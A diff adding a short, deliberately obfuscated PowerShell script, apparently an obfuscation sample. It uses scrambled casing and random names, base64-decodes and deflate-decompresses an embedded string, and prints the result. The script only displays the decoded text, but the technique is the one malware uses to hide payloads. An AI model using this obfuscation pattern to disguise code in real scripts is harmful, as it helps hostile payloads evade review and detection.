@@ -1,0 +1,17 @@
+fUNCtIoN QSDaXvX { 
+    [cMDletBIndiNG() ]Param( 
+        [PARamETER (ValuefROmpIPeLInE)]
+        $KDMJTm
+    )
+    [io.MEmorYstrEaM][cOnVert]::fRoMBasE64STrInG( $KDMJTm )|JbMVQwN
+}
+fUNCtIoN JbMVQwN { 
+    [ cMDletBIndiNG() ]Param( 
+        [PARamETER (ValuefROmpIPeLInE)]
+        $rbPsyb
+    )
+    ( nEW-obJECt   SystEM.IO.compreSSION.defLaTEStrEAm( $rbPsyb, [iO.COmPrESSIOn.COmpREsSIonmodE]::decoMpreSs )| FOReACH-ObjeCT {nEW-obJECt  io.strEamREADER( $_,[tExT.encodiNg]::aScii )} ).rEADToEnD( ) | write-host
+}
+$DuBNkmS='HcxBCoMwEEbhfU/xIy5LIBWFCj2AxxAddWCaCZlE8fatrt7m49WJrEjGB9UQYJEzQRecWjCGGV+6kzfCsakQjEVOHJpkxqocVmRFZJrIMCYtf1zsiQGiO10bx7FvW+c759+N86+uevwA'
+QSDaXvX -KDMJTm $DuBNkmS
+
